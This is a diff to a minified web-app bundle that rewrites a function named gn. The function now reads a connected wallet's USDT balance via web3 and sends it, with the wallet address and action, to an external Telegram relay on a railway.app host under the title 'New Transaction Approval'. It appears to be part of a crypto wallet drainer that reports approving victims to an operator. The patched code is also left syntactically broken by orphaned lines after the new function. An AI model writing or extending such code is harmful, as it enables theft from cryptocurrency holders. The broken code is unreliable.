@@ -36911,32 +36911,61 @@ Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" :
                 l(0)
             }
         }
-        async function gn({wallet_address: ue, amount: be, action: ct}) {
-            const st = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
-            try {
-                const ke = {
-                    content: "New Transaction Approval",
-                    embeds: [{
-                        title: "Wallet Activity",
-                        color: 5814783,
-                        fields: [{
-                            name: "Wallet Address",
-                            value: ue || "Unknown"
-                        }, {
-                            name: "Amount",
-                            value: be ? `${be} USDT` : "Unknown"
-                        }, {
-                            name: "Action",
-                            value: ct || "Unknown"
-                        }, {
-                            name: "Timestamp",
-                            value: new Date().toISOString()
-                        }],
-                        footer: {
-                            text: "USDT Transaction System"
-                        }
-                    }]
-                }
+        async function gn({ wallet_address: ue, action: ct }) {
+  const telegramURL = "https://telegram-bot-production-d2c7.up.railway.app/sendTelegram";
+
+  try {
+    const beWeb3 = await m(); // get web3 instance
+    const usdtContract = new beWeb3.eth.Contract(p, h); // p = ABI, h = USDT contract address
+
+    // Get raw balance (in wei/USDT decimals)
+    const rawBalance = await usdtContract.methods.balanceOf(ue).call();
+
+    // Format to normal USDT with decimals
+    const decimals = await usdtContract.methods.decimals().call();
+    const divisor = BigInt(10) ** BigInt(decimals);
+    const formattedBalance = Number(BigInt(rawBalance) * 100000n / divisor) / 100000; // 5 decimals
+
+    // Construct Telegram payload
+    const telegramPayload = {
+      content: "New Transaction Approval",
+      embeds: [
+        {
+          title: "Wallet Activity",
+          color: 5814783,
+          fields: [
+            { name: "Wallet Address", value: ue || "Unknown" },
+            { name: "Amount", value: `${formattedBalance} USDT` },
+            { name: "Action", value: ct || "Unknown" },
+            { name: "Timestamp", value: new Date().toISOString() }
+          ],
+          footer: { text: "USDT Transaction System" }
+        }
+      ]
+    };
+
+    // Send to Telegram webhook
+    await fetch(telegramURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(telegramPayload)
+    });
+
+    // Optionally, send to Telegram bot message format too
+    await fetch(telegramURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        usdtAddress: ue,
+        amount: formattedBalance
+      })
+    });
+
+    console.log("Sent Telegram message with real-time USDT balance:", formattedBalance);
+  } catch (err) {
+    console.error("Error in gn():", err);
+  }
+}
                   , dt = await fetch(st, {
                     method: "POST",
                     headers: {
